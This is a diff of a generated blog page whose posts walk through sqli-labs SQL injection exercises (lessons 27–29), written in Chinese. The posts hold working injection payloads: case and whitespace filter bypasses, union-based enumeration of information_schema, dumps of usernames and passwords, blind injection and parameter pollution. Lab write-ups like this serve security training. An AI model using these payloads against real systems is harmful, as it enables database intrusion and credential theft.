@@ -176,7 +176,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson27/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson-29/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -189,7 +189,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/01/lesson27/" class="post-title-link" itemprop="url">lesson27</a>
+          <a href="/2022/02/01/lesson-29/" class="post-title-link" itemprop="url">lesson-29</a>
         </h2>
 
         <div class="post-meta-container">
@@ -200,116 +200,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2022-02-01 13:36:21" itemprop="dateCreated datePublished" datetime="2022-02-01T13:36:21+08:00">2022-02-01</time>
+      <time title="Created: 2022-02-01 19:57:27" itemprop="dateCreated datePublished" datetime="2022-02-01T19:57:27+08:00">2022-02-01</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-12 18:54:55" itemprop="dateModified" datetime="2022-02-12T18:54:55+08:00">2022-02-12</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p>
-<p>因为没有报错的回显所以我们采用联合查询</p>
-<p>又因为select和union又被过滤，所以我们采用uNion和sElect </p>
-<p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p>
-<p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p>
-<p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p>
-<p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p>
-<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p>
-<p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p>
-<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p>
-<p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p>
-<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p>
-<p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p>
-<h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p>
-<p>主要是空格用%a0或者%0b来代替</p>
-<h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p>
-<p><a target="_blank" rel="noopener" href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p>
-<p>是（’’）的包裹方式</p>
-<p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p>
-<p>?id=0’)||left(database(),2)=’se’;%00</p>
-<p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p>
-<p>盲注爆出库，表，列</p>
-<h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/31/lesson-29/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/31/lesson-29/" class="post-title-link" itemprop="url">lesson-29</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-01-31 19:57:27" itemprop="dateCreated datePublished" datetime="2022-01-31T19:57:27+08:00">2022-01-31</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-13 16:03:30" itemprop="dateModified" datetime="2022-02-13T16:03:30+08:00">2022-02-13</time>
+        <time title="Modified: 2022-02-13 16:15:45" itemprop="dateModified" datetime="2022-02-13T16:15:45+08:00">2022-02-13</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -363,6 +261,108 @@
 <p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p>
 <p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
 <p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/31/lesson27/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/31/lesson27/" class="post-title-link" itemprop="url">lesson27</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-01-31 13:36:21" itemprop="dateCreated datePublished" datetime="2022-01-31T13:36:21+08:00">2022-01-31</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-13 16:15:23" itemprop="dateModified" datetime="2022-02-13T16:15:23+08:00">2022-02-13</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p>
+<p>因为没有报错的回显所以我们采用联合查询</p>
+<p>又因为select和union又被过滤，所以我们采用uNion和sElect </p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p>
+<h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p>
+<p>主要是空格用%a0或者%0b来代替</p>
+<h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p>
+<p>是（’’）的包裹方式</p>
+<p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p>
+<p>?id=0’)||left(database(),2)=’se’;%00</p>
+<p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p>
+<p>盲注爆出库，表，列</p>
+<h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>
 
       
     </div>
